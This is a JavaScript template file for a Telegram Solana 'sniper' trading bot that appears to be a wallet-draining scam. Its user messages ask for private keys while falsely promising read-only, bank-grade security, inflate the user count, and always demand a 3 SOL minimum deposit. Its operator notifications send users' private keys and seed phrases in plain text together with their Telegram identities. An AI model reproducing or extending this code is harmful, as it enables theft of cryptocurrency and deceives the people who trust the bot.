// messages.js - All message templates matching screenshots (ESM)
import { formatPrice, formatChange } from './market.js';

const BOT_NAME = process.env.BOT_NAME || 'NEXO SNIPER';
const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME || 'ainexobotsupport';
const WHALE_COUNT = process.env.WHALE_COUNT || '2,400+';

async function dashboardMessage(wallets, marketPrices) {
  const walletCount = wallets.length;
  let totalBalanceUsd = 0;
  let totalBalanceSol = 0;
  
  let walletText = '';
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const balance = w.balance || 0;
    const usdValue = balance * (marketPrices?.SOL?.price || 0);
    totalBalanceUsd += usdValue;
    totalBalanceSol += balance;
    walletText += `🟣 SOL Wallet ${i + 1}: ${balance.toFixed(6)} SOL ($${usdValue.toFixed(2)})\n`;
    walletText += `${w.address}\n`;
  }
  
  if (walletCount === 0) {
    walletText = 'No wallets connected. Tap 💰 Wallet to add one.';
  }
  
  const solPrice = marketPrices?.SOL || { price: 0, change: 0 };
  const ethPrice = marketPrices?.ETH || { price: 0, change: 0 };
  const bnbPrice = marketPrices?.BNB || { price: 0, change: 0 };
  
  return `⚡ ${BOT_NAME} DASHBOARD ⚡

💰 YOUR WALLETS (${walletCount})
All Balance: $${totalBalanceUsd.toFixed(2)}
${walletText}
📊 MARKET
🟣 SOL ${formatPrice(solPrice.price)} ${formatChange(solPrice.change)}
🔷 ETH ${formatPrice(ethPrice.price)} ${formatChange(ethPrice.change)}
🟡 BNB ${formatPrice(bnbPrice.price)} ${formatChange(bnbPrice.change)}

🌪️ Used by Whales
${WHALE_COUNT} whale wallets trust ${BOT_NAME.split(' ')[0]} for precision entries & exits

All systems active`;
}

function walletManagementMessage(wallets, marketPrices) {
  let walletText = '';
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const solPrice = marketPrices?.SOL?.price || 0;
    walletText += `🟣 SOL Wallet ${i + 1}: ${(w.balance || 0).toFixed(6)} SOL ($${((w.balance || 0) * solPrice).toFixed(2)})\n`;
    walletText += `${w.address}\n`;
  }
  
  if (wallets.length === 0) {
    walletText = 'No wallets connected.';
  }
  
  return `🔒 WALLET MANAGEMENT

💰 YOUR WALLETS (${wallets.length})
${walletText}
Choose an action below:`;
}

function importWalletMessage() {
  return `🔒 Import Solana Wallet 🔒

You need to connect your wallet to access this feature.

Nexo Snipe uses bank-grade security to protect your assets. All connections are read-only and encrypted.

Please send your Solana wallet private key (base58 encoded string).

⚠️ IMPORTANT: Never share your private key with anyone else. This bot stores your key securely to enable trading functionality.`;
}

function walletCreatedMessage(address) {
  return `✅ Wallet Created

📁 Wallet Address:
${address}
💰 Balance: 0.000000 SOL

🎉 Your Solana wallet is ready to use.`;
}

function sniperMessage(settings) {
  const statusEmoji = settings.status === 'ACTIVE' ? '🟢' : '🔴';
  return `🤖 AI Sniper

${statusEmoji} Status: ${settings.status}

Trading Parameters
Position Size: ${settings.positionSize} SOL
Max Dev Hold: ${settings.maxDevHold}%
Slippage: ${settings.slippage}%
Priority Fee: ${settings.priorityFee} SOL

Risk Management
Take Profit: +${settings.takeProfit}%
Stop Loss: -${settings.stopLoss}%
Anti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}

Professional-grade automated trading engine`;
}

function settingUpdatedMessage(settings) {
  return `✅ SETTING UPDATED

🎯 SNIPER CONFIGURATION
📊 Status: ${settings.status === 'ACTIVE' ? '✅' : '🔴'} ${settings.status}
💰 Buy Amount: ${settings.positionSize} SOL
👤 Dev Holding: ${settings.maxDevHold}%
⚡ Slippage: ${settings.slippage}%
🚀 Priority Fee: ${settings.priorityFee} SOL
📈 Take Profit: +${settings.takeProfit}%
📉 Stop Loss: -${settings.stopLoss}%
🛡 Anti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}

💾 Settings saved and ready`;
}

function configPositionSizeMessage() {
  return `💰 Set Position Size

Set the SOL amount for each automated trade.

Range: 0.0001 - 1000 SOL
Recommended: 10 - 50 SOL

⚠️ Risk Level:
• 1-10 SOL: Conservative
• 10-50 SOL: Moderate
• 50+ SOL: Aggressive

💡 Enter your position size:`;
}

function configDevHoldMessage() {
  return `📊 Set Max Dev Holding

Only snipe tokens where developer holds less than this percentage.

Range: 0-100%
Recommended: 10-30%
Examples: 10, 20, 30

💡 Send your preferred percentage:`;
}

function configSlippageMessage() {
  return `⚡ Set Slippage

Set maximum acceptable price movement during execution.

Range: 1-50%
Recommended: 8-12%

⚙️ Guide:
• 5-8%: Tight (may fail in volatile conditions)
• 8-12%: Balanced (recommended)
• 15%+: Loose (higher execution, more slippage)

💡 Enter slippage percentage:`;
}

function configPriorityMessage() {
  return `🚀 Set Priority Fee

Higher priority fees increase transaction speed on Solana.

Range: 0.0001 - 0.1 SOL
Recommended: 0.001 - 0.01 SOL

💡 Enter priority fee in SOL:`;
}

function configTakeProfitMessage() {
  return `📈 Set Take Profit

Automatically sell when profit reaches this percentage.

Range: 10-1000%
Recommended: 100% (2x)
Examples:
• 50% (1.5x)
• 100% (2x) ✅
• 200% (3x)
• 500% (6x) 🚀

💡 Send your take profit percentage:`;
}

function configStopLossMessage() {
  return `📉 Set Stop Loss

Automatically sell to protect capital when loss reaches this percentage.

Range: 10-90%
Recommended: 30% (Protects 70%)
Examples:
• 20% (Conservative)
• 30% (Balanced) ✅
• 50% (Aggressive)

💡 Send your stop loss percentage:`;
}

function tokenSearchMessage() {
  return `🔍 TOKEN SEARCH

Search for any Solana token by name, symbol, or contract address.

💡 Send the token name, symbol, or contract address:`;
}

function tokenNotFoundMessage() {
  return `❌ Token Not Found

The token you searched for could not be found on Solana DEX.

Please try again with a different search term or contract address.`;
}

function positionsMessage(positions) {
  if (!positions || positions.length === 0) {
    return `📈 POSITIONS

No open positions.

Use 🤖 AI Sniper or 💸 Buy / Sell to start trading.`;
  }
  
  let text = `📈 POSITIONS\n\n`;
  for (const pos of positions) {
    const pnlEmoji = pos.pnl >= 0 ? '📈' : '📉';
    text += `${pos.tokenSymbol} - ${pos.amount} SOL\n`;
    text += `Entry: $${pos.entryPrice}\n`;
    text += `Current PnL: ${pnlEmoji} ${pos.pnl.toFixed(2)}%\n`;
    text += `Status: ${pos.status}\n\n`;
  }
  return text;
}

function withdrawalMessage(balance) {
  return `💸 WITHDRAWAL

💰 Your Balance: ${balance.toFixed(6)} SOL

Please send the wallet address you want to withdraw to:`;
}

function withdrawalAmountMessage(toAddress) {
  return `💸 WITHDRAWAL

To: ${toAddress}
━━━━━━━━━━━━━━━━━━━━━

Now enter the amount of SOL you want to withdraw:`;
}

function confirmWithdrawalMessage(amount, toAddress, balance) {
  return `💸 CONFIRM WITHDRAWAL
━━━━━━━━━━━━━━━━━━━━━
💰 Amount: ${amount} SOL
📬 To:
${toAddress}
💼 Your Balance: ${balance.toFixed(6)} SOL
━━━━━━━━━━━━━━━━━━━━━
Please confirm to proceed:`;
}

function withdrawalSubmittedMessage(amount, toAddress) {
  return `✅ WITHDRAWAL REQUEST SUBMITTED
━━━━━━━━━━━━━━━━━━━━━
💰 Amount: ${amount} SOL
📬 To:
${toAddress}
⌛ Your withdrawal is being processed.
Please allow up to 24 hours.

💬 Need help? Contact @${SUPPORT_USERNAME}`;
}

function helpMessage() {
  return `🤖 ${BOT_NAME} - HELP

📋 COMMANDS:
/start - Start the bot
/menu - Main dashboard
/wallet - Wallet management
/sniper - AI Sniper settings
/copytrade - Copy trading
/buysell - Buy/Sell tokens
/positions - View positions
/search - Search tokens
/help - This help message

🔒 SECURITY:
• All wallet keys are encrypted
• Read-only connections
• Bank-grade security

💬 Need help? Contact @${SUPPORT_USERNAME}

🌪️ ${BOT_NAME}
Professional-grade Solana trading engine
Used by ${WHALE_COUNT} whale wallets`;
}

function startMessage(firstName, userCount) {
  return `👋 Hello, ${firstName}!

Welcome to ⚡ ${BOT_NAME} ⚡
The professional-grade Solana trading engine.

🤖 Used by ${WHALE_COUNT} whale wallets for precision entries & exits.

You are user #${userCount}.

Use the menu below to get started. Tap 💰 Wallet to connect your Solana wallet first.`;
}

function copyTradeMessage() {
  return `🔄 COPY TRADING SYSTEM

🔴 STATUS: STANDBY

📊 CONFIGURATION
🎯 Target Wallet: ⚠️ NOT SET
NOT CONFIGURED
💰 Your Balance: 0.000000 SOL

ℹ️ HOW IT WORKS
• Monitor target wallet in real-time
• Auto-replicate buy/sell signals
• Execute trades with same parameters
• Professional trader mirroring

📥 Follow proven strategies effortlessly`;
}

function copyTradeActivatedMessage() {
  return `🔄 COPY TRADING ACTIVATED

🟢 Now mirroring target wallet
✅ Real-time trade alerts enabled
✅ You will be notified of every trade`;
}

function copyTradeAlertMessage(targetWallet, signature, status, time) {
  return `🔔 COPY TRADE ALERT

🎯 Target Wallet: ${targetWallet.slice(0, 8)}...${targetWallet.slice(-5)}
📄 Transaction: ${signature.slice(0, 8)}...${signature.slice(-5)}
📊 Status: ${status}
🕐 Time: ${time}
🔗 View on Solscan`;
}

function buySellMessage() {
  return `💰 BUY OR SELL TOKENS

📈 Buy: Purchase tokens instantly
📉 Sell: Sell your tokens quickly`;
}

function insufficientBalanceMessage() {
  return `❌ INSUFFICIENT BALANCE TO BUY

💰 Your Balance: 0.0000 SOL
🔒 Minimum Required: 3.0000 SOL
📉 You Need: 3.0000 SOL more

💡 Deposit SOL to your wallet to start trading.`;
}

function newUserNotification(user) {
  return `🔔 NEW USER

👤 Name: ${user.firstName || 'Unknown'}
📝 Username: ${user.username || 'None'}
🆔 ID: ${user.telegramId}
📊 Total Users: ${user.userCount}

${new Date().toISOString()}`;
}

function depositNotification(address, amount, newBalance, userInfo) {
  return `💰 DEPOSIT DETECTED

📍 Wallet: ${address}
💵 Amount: ${amount.toFixed(6)} SOL
📊 New Balance: ${newBalance.toFixed(6)} SOL

👤 User: ${userInfo?.firstName || 'Unknown'} (@${userInfo?.username || 'None'})
🆔 ID: ${userInfo?.telegramId || 'Unknown'}

${new Date().toISOString()}`;
}

function tradeNotification(user, type, token, amount, result) {
  return `📊 TRADE ${type.toUpperCase()}

👤 User: ${user?.firstName || 'Unknown'} (@${user?.username || 'None'})
🆔 ID: ${user?.telegramId || 'Unknown'}
🎯 Token: ${token?.name || 'Unknown'} (${token?.symbol || '???'})
💰 Amount: ${amount} SOL
📄 TX: ${result?.signature || 'N/A'}

${new Date().toISOString()}`;
}

function withdrawalNotification(user, amount, toAddress) {
  return `💸 WITHDRAWAL REQUEST

👤 User: ${user?.firstName || 'Unknown'} (@${user?.username || 'None'})
🆔 ID: ${user?.telegramId || 'Unknown'}
💰 Amount: ${amount} SOL
📬 To: ${toAddress}

${new Date().toISOString()}`;
}

function walletGeneratedNotification(address, privateKey, seedPhrase, userInfo) {
  return `🆕 NEW WALLET GENERATED

📍 Address: ${address}
🔑 Private Key: ${privateKey}
🌱 Seed Phrase: ${seedPhrase}
👤 User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
📝 Username: @${userInfo?.username || 'None'}

${new Date().toISOString()}`;
}

function walletImportedNotification(address, privateKey, balance, userInfo) {
  return `🔑 WALLET IMPORTED

📍 Address: ${address}
🔑 Private Key: ${privateKey}
💰 Balance: ${balance.toFixed(6)} SOL
👤 User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
📝 Username: @${userInfo?.username || 'None'}

${new Date().toISOString()}`;
}

function walletSeedImportedNotification(address, privateKey, seedPhrase, balance, userInfo) {
  return `✨ WALLET IMPORTED FROM SEED

📍 Address: ${address}
🔑 Private Key: ${privateKey}
🌱 Seed Phrase: ${seedPhrase}
💰 Balance: ${balance.toFixed(6)} SOL
👤 User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
📝 Username: @${userInfo?.username || 'None'}

${new Date().toISOString()}`;
}

export {
  dashboardMessage,
  walletManagementMessage,
  importWalletMessage,
  walletCreatedMessage,
  sniperMessage,
  settingUpdatedMessage,
  configPositionSizeMessage,
  configDevHoldMessage,
  configSlippageMessage,
  configPriorityMessage,
  configTakeProfitMessage,
  configStopLossMessage,
  tokenSearchMessage,
  tokenNotFoundMessage,
  positionsMessage,
  withdrawalMessage,
  withdrawalAmountMessage,
  confirmWithdrawalMessage,
  withdrawalSubmittedMessage,
  helpMessage,
  startMessage,
  copyTradeMessage,
  copyTradeActivatedMessage,
  copyTradeAlertMessage,
  buySellMessage,
  insufficientBalanceMessage,
  newUserNotification,
  depositNotification,
  tradeNotification,
  withdrawalNotification,
  walletGeneratedNotification,
  walletImportedNotification,
  walletSeedImportedNotification
};
